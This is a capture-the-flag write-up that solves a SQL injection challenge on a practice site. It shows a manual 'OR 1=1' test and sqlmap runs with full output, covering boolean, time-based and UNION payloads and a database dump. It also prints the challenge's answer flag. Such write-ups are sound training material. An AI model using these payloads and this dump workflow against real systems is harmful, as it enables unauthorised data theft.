## Inj3ction Time
### Difficulty: Hard

![Imgur](https://i.imgur.com/eaxtmf0.png)

Guide:
> I stumbled upon this website: http://web.ctflearn.com/web8/ and I think they have the flag in their somewhere. UNION might be a helpful command

On checking the site, this hosts a Dog Viewer web app. Typing in numbers in the id section and submiting the form will return information from the database.

![Imgur](https://i.imgur.com/KK1EXvx.png)

This basic form is injectable, it uses a GET request to collect data from the database. Injecting ```1 OR 1=1``` into the input field showed all the data in the working table.. 

![Imgur](https://i.imgur.com/L29WR3T.png)

One can conclude that this form sends something like ```SELECT * FROM table WHERE  id = 1 OR 1=1;``` to fulfil the request. Next, I used burp to intercept the request and save it into a file named *nice* 

```
GET /web8/?id=2 HTTP/2
Host: web.ctflearn.com
Cookie: _ga=GA1.2.1205454242.1689258609; __gads=ID=065b0c1ade0c78d7-2236ba4e3ce00013:T=1689258608:RT=1689430712:S=ALNI_MblLK9m49cTlH-uZ0k268OZM6BV7g; __gpi=UID=00000c68c7d9b5f6:T=1689258608:RT=1689430712:S=ALNI_Mbk6UXgdDL9ydzjOSvYw6p8TNeLEQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://web.ctflearn.com/web8/?id=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

```
Next, I used sqlmap to automate the process and fetch the database using the GET request i saved

```
┌──(gr33pp㉿machine)-[~]
└─$ sqlmap -r nice                                     
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:16:37 /2023-07-17/

[00:16:37] [INFO] parsing HTTP request from 'nice'
[00:16:39] [INFO] testing connection to the target URL
got a 301 redirect to 'https://web.ctflearn.com/web8/?id=2'. Do you want to follow? [Y/n] y
[00:16:45] [INFO] testing if the target URL content is stable
[00:16:46] [WARNING] GET parameter 'id' does not appear to be dynamic
[00:16:47] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[00:16:48] [INFO] testing for SQL injection on GET parameter 'id'
[00:16:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:16:51] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[00:17:06] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[00:17:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[00:17:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[00:17:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[00:17:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[00:17:22] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[00:17:23] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[00:17:24] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[00:17:25] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[00:17:25] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:17:26] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:17:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[00:17:28] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[00:17:28] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[00:17:29] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[00:17:30] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[00:17:31] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[00:17:31] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[00:17:33] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[00:17:34] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[00:17:35] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[00:17:35] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[00:17:36] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[00:17:37] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[00:17:38] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[00:17:38] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[00:17:39] [INFO] testing 'Generic inline queries'
[00:17:40] [INFO] testing 'MySQL inline queries'
[00:17:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[00:17:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[00:17:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[00:17:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[00:17:43] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[00:17:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[00:17:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[00:17:57] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[00:17:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:17:57] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[00:17:59] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[00:18:02] [INFO] target URL appears to have 4 columns in query
[00:18:04] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2 AND 1007=1007

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2 AND (SELECT 2502 FROM (SELECT(SLEEP(5)))IRMl)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=2 UNION ALL SELECT CONCAT(0x716a767a71,0x64524b47634174684f416f59426b65724f495250757a6645414454624f6f576a5a75796d53656d53,0x716a787871),NULL,NULL,NULL-- -
---
[00:18:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9
back-end DBMS: MySQL >= 5.0.12
[00:18:21] [INFO] fetched data logged to text files under _redacted_

```

Sqlmap found id to be vulnerable to UNION query as the challenge guide gave clue of using UNION. Next, I dump the database and found the flag 

```
┌──(gr33pp㉿machine)-[~]
└─$ sqlmap -r nice -p id --dump
        ___
       __H__                                                                                                            
 ___ ___[']_____ ___ ___  {1.7.2#stable}                                                                                
|_ -| . ["]     | .'| . |                                                                                               
|___|_  [.]_|_|_|__,|  _|                                                                                               
      |_|V...       |_|   https://sqlmap.org                                                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:23:41 /2023-07-17/

[00:23:41] [INFO] parsing HTTP request from 'nice'
[00:23:41] [INFO] resuming back-end DBMS 'mysql' 
[00:23:41] [INFO] testing connection to the target URL
got a 301 redirect to 'https://web.ctflearn.com/web8/?id=2'. Do you want to follow? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2 AND 1007=1007

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2 AND (SELECT 2502 FROM (SELECT(SLEEP(5)))IRMl)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=2 UNION ALL SELECT CONCAT(0x716a767a71,0x64524b47634174684f416f59426b65724f495250757a6645414454624f6f576a5a75796d53656d53,0x716a787871),NULL,NULL,NULL-- -
---
[00:23:47] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9
back-end DBMS: MySQL >= 5.0.12
[00:23:47] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[00:23:47] [INFO] fetching current database
[00:23:48] [INFO] fetching tables for database: 'webeight'
[00:23:49] [INFO] fetching columns for table 'w0w_y0u_f0und_m3' in database 'webeight'
[00:23:51] [INFO] fetching entries for table 'w0w_y0u_f0und_m3' in database 'webeight'
Database: webeight
Table: w0w_y0u_f0und_m3
[1 entry]
+---------------------------------+
| f0und_m3                        |
+---------------------------------+
| abctf{uni0n_1s_4_gr34t_c0mm4nd} |
+---------------------------------+

[00:23:53] [INFO] table 'webeight.w0w_y0u_f0und_m3' dumped to CSV file                                                                           
[00:23:53] [INFO] fetching columns for table 'webeight' in database 'webeight'
[00:23:54] [INFO] fetching entries for table 'webeight' in database 'webeight'
Database: webeight
Table: webeight
[3 entries]
+----+---------+------------+-------+
| id | name    | breed      | color |
+----+---------+------------+-------+
| 1  | Saranac | Great Dane | Black |
| 2  | Doodle  | Poodle     | Pink  |
| 3  | Dexter  | Lab        | White |
+----+---------+------------+-------+

```

flag found. I rate this as easy :)

Flag: abctf{uni0n_1s_4_gr34t_c0mm4nd}

And done!
